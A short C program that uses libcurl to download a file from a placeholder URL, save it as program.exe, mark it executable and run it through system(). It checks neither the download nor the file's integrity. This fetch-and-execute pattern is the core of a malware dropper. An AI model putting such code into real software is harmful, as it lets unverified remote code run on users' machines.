#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <sys/stat.h>

size_t write_data(void *ptr, size_t size, size_t nmeb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmeb, stream);
    return written;
}

int download_and_execute(const char* url) {
    CURL *curl;
    FILE *fp;
    CURLcode res;
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if(curl) {
        fp = fopen("program.exe", "wb");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        fclose(fp);

        // Ensure the file is executable
        chmod("program.exe", S_IRWXU);

        // Execute the downloaded file
        system("./program.exe");

        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
    return 0;
}

int main() {
    const char* url = "http://example.com/program.exe";
    download_and_execute(url);
    return 0;
}